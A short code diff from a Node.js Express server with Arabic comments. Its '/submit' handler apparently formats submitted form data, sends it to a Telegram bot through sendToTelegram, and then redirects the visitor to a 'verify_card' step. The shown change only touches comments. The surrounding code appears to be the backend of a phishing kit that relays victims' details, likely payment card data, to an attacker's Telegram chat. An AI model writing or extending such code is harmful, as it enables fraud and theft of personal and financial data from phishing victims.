@@ -67,8 +67,8 @@ app.post('/submit', async (req, res) => {
         `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
       await sendToTelegram(message);
-      console.log('Redirecting to /?step=verify_card'); // Debugging
-      // بديل للتوجيه: إعادة تحميل الصفحة مع المعلمة
+      console.log('Redirecting to /?step=verify_card');
+      // إعادة تحميل الصفحة مع المعلمة الجديدة
       return res.send(`
         <script>
           window.location.href = '/?step=verify_card';
